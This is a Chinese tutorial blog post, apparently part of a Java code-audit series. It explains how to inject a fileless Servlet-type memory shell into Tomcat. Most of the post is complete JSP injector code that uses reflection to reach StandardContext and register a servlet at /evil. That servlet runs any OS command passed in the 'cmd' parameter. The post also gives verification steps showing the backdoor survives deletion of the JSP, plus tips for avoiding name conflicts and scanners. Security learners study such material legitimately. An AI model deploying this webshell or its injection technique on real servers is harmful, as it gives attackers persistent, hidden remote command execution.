+<h2 id="四、前置知识：Servlet-动态注册-API"><a href="#四、前置知识：Servlet-动态注册-API" class="headerlink" title="四、前置知识：Servlet 动态注册 API"></a>四、前置知识：Servlet 动态注册 API</h2><p>这里有个关键差异：</p>
+<ul>
+<li><strong>Filter 型</strong>：需要反射拿到 <code>StandardContext</code>，因为 <code>ServletContext</code> 接口没有提供操作 Filter 内部集合的 API。</li>
+<li><strong>Servlet 型</strong>：也需要拿<code>StandardContext</code>弄错了 , 后面有讲。</li>
+</ul>
+<p>Servlet 3.0 引入了 <code>ServletContext</code> 接口的几个方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, Servlet servlet)</span>;</span><br><span class="line"><span class="keyword">public</span> ServletRegistration.Dynamic <span class="title function_">addServlet</span><span class="params">(String servletName, Class&lt;? extends Servlet&gt; servletClass)</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">重载方式</th>
+<th align="left">参数</th>
+<th align="left">实例化责任</th>
+<th align="left">内存马适用性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>addServlet(String, Servlet)</code></td>
+<td align="left">已创建好的 Servlet 实例</td>
+<td align="left"><strong>你自己 new 好</strong>，直接传入</td>
+<td align="left">✅ <strong>常用</strong>，因为要用匿名内部类嵌入恶意逻辑</td>
+</tr>
+<tr>
+<td align="left"><code>addServlet(String, Class&lt;? extends Servlet&gt;)</code></td>
+<td align="left">Servlet 类的 Class 对象</td>
+<td align="left"><strong>Tomcat 负责</strong>通过反射调用 <code>newInstance()</code> 创建实例</td>
+<td align="left">❌ 不常用，无法直接嵌入匿名内部类的命令执行逻辑</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>servletName</code></td>
+<td align="left">Servlet 的<strong>内部唯一标识名称</strong>，相当于 <code>web.xml</code> 中的 <code>&lt;servlet-name&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><code>servlet</code></td>
+<td align="left">已经实例化好的 <strong>Servlet 对象</strong></td>
+</tr>
+<tr>
+<td align="left"><code>servletClass</code></td>
+<td align="left">Servlet 的 Class 对象，容器会通过反射自动创建实例</td>
+</tr>
+</tbody></table>
+<p><strong>返回值</strong>：<code>ServletRegistration.Dynamic</code> 接口实例，用于进一步配置该 Servlet 的映射路径、初始化参数、加载顺序等。</p>
+<p><code>ServletRegistration.Dynamic</code> 提供了 <code>addMapping(String... urlPatterns)</code> 方法，用于为 Servlet 指定 URL 映射（等价于 <code>web.xml</code> 中 <code>&lt;servlet-mapping&gt;</code> 的 <code>&lt;url-pattern&gt;</code>）(弄错了 , 这样只能静态添加 , 动态注册仍要反射用<code>StandardContext</code>里的方法)：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ServletRegistration.<span class="type">Dynamic</span> <span class="variable">dynamic</span> <span class="operator">=</span> servletContext.addServlet(<span class="string">&quot;evilServlet&quot;</span>, evilServlet);</span><br><span class="line">dynamic.addMapping(<span class="string">&quot;/evil&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、直接调用-addServlet-的问题"><a href="#五、直接调用-addServlet-的问题" class="headerlink" title="五、直接调用 addServlet 的问题"></a>五、直接调用 addServlet 的问题</h2><p>如果不考虑限制，直接写一个 JSP 调用 <code>addServlet</code>：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">                &#125;</span><br><span class="line">                resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Servlet is running...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            doGet(req, resp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ServletRegistration.<span class="type">Dynamic</span> <span class="variable">dynamic</span> <span class="operator">=</span> servletContext.addServlet(<span class="string">&quot;evilServlet&quot;</span>, evilServlet);</span><br><span class="line">    dynamic.addMapping(<span class="string">&quot;/evil&quot;</span>);</span><br><span class="line">    out.println(<span class="string">&quot;Servlet 内存马注入成功！访问 /evil?cmd=whoami 测试&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>http://localhost:8080/inject.jsp</code> 后会直接报错：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image5.png"></p>
+<p><strong>报错原因</strong>：这是 <strong>Servlet 规范的限制</strong>——一旦 Web 应用启动完成，<code>ServletContext</code> 就进入”已初始化”状态，<strong>禁止再调用 <code>addServlet()</code> 动态注册</strong>。</p>
+<p><code>addServlet()</code> 方法内部会调用 <code>checkState()</code>，判断应用是否已完成初始化，如果已完成则抛出 <code>IllegalStateException</code>。</p>
+<hr>
+<h2 id="六、Servlet-型内存马注入代码（反射绕过）"><a href="#六、Servlet-型内存马注入代码（反射绕过）" class="headerlink" title="六、Servlet 型内存马注入代码（反射绕过）"></a>六、Servlet 型内存马注入代码（反射绕过）</h2><h3 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h3><p>和 Filter 型一样，用<strong>反射绕过限制</strong>：拿到 <code>StandardContext</code>，然后往它的 <code>children</code>（一个 <code>HashMap&lt;String, Container&gt;</code>）里添加一个 <code>StandardWrapper</code> 对象，并配置映射。</p>
+<p>完整注入代码 <code>inject.jsp</code>：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardWrapper&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">// ========== 第一步：反射获取 StandardContext ==========</span></span><br><span class="line"><span class="comment">// 低版本写法：ServletContext servletContext = request.getSession().getServletContext();</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和 Filter 一样，需要反射两层获取核心对象 StandardContext</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 获取 ApplicationContext</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 获取 StandardContext</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拿到 StandardContext 后，后续操作调用的都是其公开方法（addChild、addServletMappingDecoded），无需再次动用反射。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 第二步：定义恶意 Servlet（匿名内部类） ==========</span></span><br><span class="line"><span class="comment">// 通过匿名内部类的方式，直接继承抽象类 HttpServlet 并重写 doGet 和 doPost 方法</span></span><br><span class="line"><span class="comment">// 无需单独编写 .java 文件</span></span><br><span class="line"><span class="type">Servlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpServlet</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 获取请求参数 cmd</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 调用系统命令</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            <span class="comment">// 把结果输出到网页</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="keyword">while</span> ((len = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(buffer, <span class="number">0</span>, len);</span><br><span class="line">            &#125;</span><br><span class="line">            resp.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(baos.toByteArray(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Servlet is running...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">// doPost 直接调用 doGet，确保 GET/POST 都能触发命令执行</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为什么 Servlet 不用写 init 和 destroy？</span></span><br><span class="line"><span class="comment">// 因为 HttpServlet 是抽象类，它已经为 init() 和 destroy() 提供了默认的空实现，不写也不会报错。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为什么 Filter 必须写 init 和 destroy？</span></span><br><span class="line"><span class="comment">// 因为 Filter 是接口，接口中所有方法都是抽象的，没有方法体。</span></span><br><span class="line"><span class="comment">// 必须把三个方法全部实现，哪怕不需要也得写上空的大括号 &#123;&#125;，否则编译不通过。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ========== 第三步：通过 StandardContext 注册 Servlet ==========</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 创建 StandardWrapper 包装 Servlet</span></span><br><span class="line"><span class="comment">// 在 Tomcat 内部，每一个 Servlet 都不是直接裸露的，而是被一个 StandardWrapper 对象包装起来</span></span><br><span class="line"><span class="comment">// 类似 Filter 里的 FilterDef 存储 Filter 的元信息（名称、类名、实例引用）</span></span><br><span class="line"><span class="comment">// 需要先包装后才能传入 StandardContext</span></span><br><span class="line"><span class="comment">// 而传入的方法可以直接用 addChild（因为是 public 的）</span></span><br><span class="line"><span class="type">StandardWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardWrapper</span>();</span><br><span class="line">wrapper.setName(<span class="string">&quot;evilServlet&quot;</span>);             <span class="comment">// 标识</span></span><br><span class="line">wrapper.setServlet(evilServlet);            <span class="comment">// 直接设置实例</span></span><br><span class="line">wrapper.setServletClass(evilServlet.getClass().getName()); <span class="comment">// 设置类名（可选）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 将 Wrapper 添加到 StandardContext 的子容器中</span></span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 添加 URL 映射</span></span><br><span class="line"><span class="comment">// 关于 addServletMappingDecoded：</span></span><br><span class="line"><span class="comment">// 在 Tomcat 9 中，旧版的 addServletMapping 已被废弃并移除，取而代之的是 addServletMappingDecoded。</span></span><br><span class="line"><span class="comment">// 带 Decoded 后缀的方法会对 URL 路径进行百分号解码处理，避免双重编码问题。</span></span><br><span class="line"><span class="comment">// 它是 StandardContext 的 public 方法，直接调用即可。</span></span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/evil&quot;</span>, <span class="string">&quot;evilServlet&quot;</span>);</span><br><span class="line"></span><br><span class="line">out.println(<span class="string">&quot;Servlet 内存马注入成功（反射方式）！访问 /evil?cmd=whoami 测试&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码结构梳理"><a href="#代码结构梳理" class="headerlink" title="代码结构梳理"></a>代码结构梳理</h3><p>整个注入流程可以拆成三步：</p>
+<ol>
+<li><strong>反射两层</strong>，从 <code>ServletContext</code> 挖到 <code>StandardContext</code>（和 Filter 型一模一样）</li>
+<li><strong>匿名内部类</strong>定义恶意 Servlet，重写 <code>doGet</code>&#x2F;<code>doPost</code>，嵌入命令执行逻辑</li>
+<li><strong>StandardWrapper 包装</strong> → <code>addChild</code> 注册 → <code>addServletMappingDecoded</code> 映射路径</li>
+</ol>
+<p>和 Filter 型对比，Servlet 型少了操作 <code>filterMaps</code>、<code>filterConfigs</code> 那一套，整体更简洁。</p>
+<hr>
+<h2 id="七、验证步骤"><a href="#七、验证步骤" class="headerlink" title="七、验证步骤"></a>七、验证步骤</h2><p><strong>1. 准备环境</strong>：确保 Tomcat 正在运行，且存在一个 Web 应用（比如之前的 Filter 项目）。</p>
+<p>**2. 上传 <code>injectServlet.jsp</code>**：将该 JSP 文件放到 Web 应用的根目录（如 <code>webapp/injectServlet.jsp</code>）。</p>
+<p><strong>3. 访问注入页面</strong>：浏览器访问 <code>http://localhost:8080/injectServlet.jsp</code>，页面显示”注入成功”。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image6.png"></p>
+<p><strong>4. 测试后门</strong>：访问 <code>http://localhost:8080/evil?cmd=whoami</code>，看到命令执行结果。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image7.png"></p>
+<p><strong>5. 验证无文件落地</strong>：删除 <code>injectServlet.jsp</code> 文件，再次访问 <code>http://localhost:8080/injectServlet.jsp</code> 显示 404：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image8.png"></p>
+<p>再次访问 <code>/evil?cmd=calc</code>，仍然有效：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image9.png"></p>
+<p><strong>6. 重启验证</strong>：重启 Tomcat 后直接访问 <code>/evil?cmd=whoami</code>，显示 404 或首页，说明内存马已消失（内存已释放）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image10.png"></p>
+<hr>
+<h2 id="八、注意事项"><a href="#八、注意事项" class="headerlink" title="八、注意事项"></a>八、注意事项</h2><h3 id="1-路径冲突问题"><a href="#1-路径冲突问题" class="headerlink" title="1. 路径冲突问题"></a>1. 路径冲突问题</h3><p>如果目标应用本身已经有一个名为 <code>evilServlet</code> 的 Servlet，或存在 <code>/evil</code> 的映射，<code>addServlet</code> 或 <code>addMapping</code> 会抛出异常。在实际渗透中，攻击者通常会使用随机字符串（如 UUID）作为名称和路径，避免冲突。</p>
+<h3 id="2-与-Filter-型的适用场景"><a href="#2-与-Filter-型的适用场景" class="headerlink" title="2. 与 Filter 型的适用场景"></a>2. 与 Filter 型的适用场景</h3><ul>
+<li><strong>Filter 型</strong>：适合”通杀”所有请求，隐蔽性好，但需要较多反射代码。</li>
+<li><strong>Servlet 型</strong>：适合需要独立 API 接口的场景，实现简单，但路径固定，容易被扫描器发现。</li>
+</ul>
+<h3 id="3-安全配置的影响"><a href="#3-安全配置的影响" class="headerlink" title="3. 安全配置的影响"></a>3. 安全配置的影响</h3><p>如果目标应用使用了 <code>SecurityManager</code> 或 Tomcat 的 <code>security-constraint</code> 限制了对特定路径的访问，注入的 Servlet 也可能受到限制。</p>
+<hr>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>Servlet 型内存马整体比 Filter 型<strong>简单</strong>，核心流程：</p>
+<ol>
+<li>反射两层拿 <code>StandardContext</code>（和 Filter 型相同）</li>
+<li>匿名内部类写恶意 Servlet，<code>doPost</code> 转发给 <code>doGet</code></li>
+<li><code>StandardWrapper</code> 包装实例 → <code>addChild</code> → <code>addServletMappingDecoded</code> 完成注册</li>
+</ol>
+<p>不需要操作三个集合，也不需要手动操作 <code>filterConfigs</code>，整体代码量少了不少。</p>
+<p>但相比 Filter 型，<strong>隐蔽性较差</strong>：Filter 挂载在 <code>/*</code> 上，混在正常业务流量里；Servlet 需要独立路径，容易被安全扫描器或流量分析发现。</p>
+<p>下一篇：<strong>Listener 型内存马</strong>——它无需映射任何 URL，却能监听所有请求，是目前隐蔽性最强的一种形式。</p>
+<hr>
+<blockquote>
+<p>参考环境：Tomcat 9、JDK 8u65、Servlet 3.0+</p>
+</blockquote>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-Servlet-%E2%80%94%E2%80%94-Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">代码审计 | Servlet —— Tomcat 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Servlet-%E6%98%AF%E5%A6%82%E4%BD%95%E6%B3%A8%E5%86%8C%E5%92%8C%E5%B7%A5%E4%BD%9C%E7%9A%84"><span class="toc-text">一、Servlet 是如何注册和工作的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E-loadOnStartup%EF%BC%88%E6%87%92%E5%8A%A0%E8%BD%BD%EF%BC%89"><span class="toc-text">关于 loadOnStartup（懒加载）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Filter-%E5%92%8C-Servlet-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">二、Filter 和 Servlet 的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Filter-%E5%92%8C-Servlet-%E5%9C%A8-Java-%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E4%B8%8A%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-text">Filter 和 Servlet 在 Java 继承结构上的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95%E5%AF%B9%E6%AF%94"><span class="toc-text">处理方法对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%8C%E8%B4%A3%E5%AF%B9%E6%AF%94"><span class="toc-text">职责对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81-web-xml-%E5%86%99%E6%B3%95"><span class="toc-text">静态 web.xml 写法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%9B%9E%E9%A1%BE%E5%AF%B9%E6%AF%94%EF%BC%9AFilter-%E5%9E%8B-vs-Servlet-%E5%9E%8B"><span class="toc-text">三、回顾对比：Filter 型 vs Servlet 型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9AServlet-%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C-API"><span class="toc-text">四、前置知识：Servlet 动态注册 API</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8-addServlet-%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">五、直接调用 addServlet 的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81Servlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%EF%BC%88%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">六、Servlet 型内存马注入代码（反射绕过）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%80%9D%E8%B7%AF"><span class="toc-text">解决思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86"><span class="toc-text">代码结构梳理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E9%AA%8C%E8%AF%81%E6%AD%A5%E9%AA%A4"><span class="toc-text">七、验证步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">八、注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E5%BE%84%E5%86%B2%E7%AA%81%E9%97%AE%E9%A2%98"><span class="toc-text">1. 路径冲突问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8E-Filter-%E5%9E%8B%E7%9A%84%E9%80%82%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-text">2. 与 Filter 型的适用场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%9A%84%E5%BD%B1%E5%93%8D"><span 